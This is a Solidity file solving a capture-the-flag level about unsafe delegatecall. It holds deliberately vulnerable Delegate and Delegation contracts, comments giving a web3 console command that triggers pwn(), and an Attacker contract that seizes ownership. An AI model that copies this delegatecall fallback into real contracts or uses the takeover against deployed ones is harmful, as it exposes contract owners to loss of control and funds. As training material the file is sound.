// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//The goal of this level is for you to claim ownership of the instance you are given.
//0x8903a89821Bac1c6a9CEB05354AB52a630616e2a
//0x76934b4018BE4aC3c259Ffe641A389821B007d30

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

//solution
//  Attacker exists to claim the ownership to its contract address
//  To claim the ownership to the origin address we should call the fallback directly
//  Solution #1: we may import a Delegate at address of Delegation
//               If we call pwn() from Delegate's HUD, that will actualy call Fallback, cause Delegation doesn't have pwn()
//  Solution #2: enter in console
//               await contract.sendTransaction({from:player,to:contract.address,data:web3.eth.abi.encodeFunctionSignature('pwn()')})

contract Attacker {
    address _target;

    constructor(address target) {
        _target = target;
    }

    function Attack() public {
        _target.call(abi.encodeWithSignature("pwn()"));
    }
}